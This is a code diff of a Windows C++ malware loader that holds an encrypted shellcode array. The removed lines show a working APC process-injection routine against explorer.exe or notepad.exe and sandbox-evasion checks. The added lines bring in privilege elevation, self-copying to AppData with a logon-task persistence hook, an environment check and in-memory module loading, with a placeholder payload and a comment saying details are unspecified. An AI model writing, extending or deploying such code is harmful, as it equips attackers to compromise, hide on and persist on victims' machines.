@@ -6,6 +6,9 @@
 #include "jitdecrypt.h"
 #include "apis.h"
 #include "persistence.h"
+#include "elevation.h"
+#include "environment.h"
+#include "module_loader.h"
 #include <string>
 
 // Add required libraries for linking
@@ -33,97 +36,22 @@ unsigned char payload[] = {
     0x9e, 0x79, 0xba, 0x7c, 0xee, 0x79, 0x6f, 0x87, 0xe4, 0xb5, 0x24, 0x81, 0x95, 0x3a, 0x65, 0xd3,
     0xbd, 0x76, 0x40, 0xbc
 };
-PVOID remoteBuf;
-HANDLE processHandle;
-STARTUPINFO info = { 0 };
-PROCESS_INFORMATION processInfo = { 0 };
 
-int remInj() {
-    DWORD pid = findPID();
-    if (pid != 0) {
-        printf("Found explorer.exe with PID: %d\n", pid);
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-    else if (CreateProcess(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
-        pid = findPID();
-        printf("Created notepad.exe with PID: %d\n", pid);
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-    else {
-        printf("Failed to find or create notepad.exe\n");
-        return 0;
-    }
+int wmain() {
+    EnsureElevated();
 
-    NTSTATUS status;
-    SIZE_T allocSize = sizeof(payload);
-
-    status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (status == 0) {
-        printf("Allocated memory at: %p\n", remoteBuf);
-    }
-    else {
-        printf("Failed to allocate memory\n");
-        return 0;
-    }
-
-    DWORD keySeed = 0x12345678;
-    printf("Decrypting payload with key seed: 0x%x\n", keySeed);
-    JITDecrypt(payload, sizeof(payload), keySeed);
-
-    status = NtWriteVirtualMemory(processHandle, remoteBuf, payload, sizeof(payload), NULL);
-    if (status == 0) {
-        printf("Payload written successfully\n");
-    }
-    else {
-        printf("Failed to write payload\n");
-        return 0;
-    }
-
-    if (QueueAPCInject_x64(processHandle, remoteBuf)) {
-        printf("APC queued successfully\n");
-    }
-    else {
-        printf("Failed to queue APC\n");
-    }
-
-    NtClose(processHandle);
-
-    return 0;
-}
-
-int antidbg() {
-    MEMORYSTATUSEX memoryStatus;
-    memoryStatus.dwLength = sizeof(memoryStatus);
-    GlobalMemoryStatusEx(&memoryStatus);
-    DWORD RAM = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
-    if (RAM < 4096) {
-        return -1;
-    }
-    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-    DISK_GEOMETRY pDiskGeometry;
-    DWORD bytesReturned;
-    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
-    DWORD disk = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024);
-    if (disk < 100) {
-        return -1;
-    }
-
-    remInj();
-    return 44;
-}
-
-int main(int argc, char* argv[]) {
     std::wstring destPath;
     if (CopySelfToAppData(destPath)) {
         RegisterLogonTask(destPath);
     }
 
-    if (antidbg() == 44) {
-        printf("Running xD\n");
-        return 0;
+    if (CheckEnvironment() == 0) {
+        // The details of the module and target process are not specified,
+        // so we'll use a placeholder for now.
+        HANDLE targetProcess = GetCurrentProcess();
+        unsigned char payload[] = { 0x90, 0x90, 0x90, 0x90 };
+        LaunchInMemoryModule(targetProcess, payload, sizeof(payload));
     }
-    else if (antidbg() == -1) {
-        printf("in a sandbox xD\n");
-        return 0;
-    }
+
+    return 0;
 }
